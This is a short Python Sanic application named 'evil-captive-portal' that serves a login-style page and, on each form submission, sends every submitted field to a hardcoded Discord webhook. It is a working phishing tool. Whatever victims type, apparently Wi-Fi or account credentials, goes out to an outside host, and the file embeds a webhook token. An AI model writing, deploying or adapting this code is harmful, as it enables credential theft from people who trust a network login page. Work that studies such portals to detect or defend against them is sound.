from sanic import Sanic, Request
from sanic_ext import render
import httpx

WEBHOOK_URL = 'https://discord.com/api/webhooks/1396528874942107778/8TVCW9fia26KEFU21yOg6P74jAu8i0wLeAD4520GaLnx7q9SHrsa1iqFIxOmElALqtUr'

app = Sanic('evil-captive-portal')

app.static('/static', 'static', directory_view=True)


@app.get('/')
async def index(req):
    return await render("index.html")


@app.post('/')
async def handle_form(req: Request):
    form = req.get_form()
    
    content = "\n".join(f"**{k}**: {v}" for k, v in form.items())


    async with httpx.AsyncClient() as client:
        await client.post(
            WEBHOOK_URL,
            json={"content": f"🚨 New form submission:\n{content}"}
        )

    return await render("success.html")